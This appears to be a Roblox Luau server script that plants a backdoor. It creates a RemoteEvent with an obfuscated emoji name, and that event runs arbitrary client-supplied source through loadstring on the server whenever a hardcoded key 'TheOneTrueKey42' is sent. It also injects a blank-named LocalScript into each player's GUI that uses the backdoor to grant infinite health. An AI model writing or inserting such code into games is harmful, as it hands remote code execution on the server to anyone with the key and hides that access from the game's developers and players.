local RS = game:GetService("ReplicatedStorage")
local HS = game:GetService("HttpService")
local PS = game:GetService("Players")

local function _G_INIT()
    local k = "TheOneTrueKey42"
    local id = "\240\159\141\149"
    
    local e = Instance.new("RemoteEvent")
    e.Name = id
    e.Parent = RS
    
    e.OnServerEvent:Connect(function(p, ak, src)
        if ak == k then
            local f, err = loadstring(src)
            if f then
                task.spawn(f, p)
            end
        end
    end)
end

local function _C_INJECT(p)
    local s = Instance.new("LocalScript")
    s.Name = " "
    s.Source = [[
        local r = game:GetService("ReplicatedStorage")
        local i = "\240\159\141\149"
        local k = "TheOneTrueKey42"
        local ev = r:WaitForChild(i)
        
        local payload = "local p = ...; p.Character.Humanoid.MaxHealth = math.huge; p.Character.Humanoid.Health = math.huge"
        ev:FireServer(k, payload)
    ]]
    s.Parent = p:WaitForChild("PlayerGui")
end

task.spawn(_G_INIT)
PS.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Wait()
    _C_INJECT(p)
end)
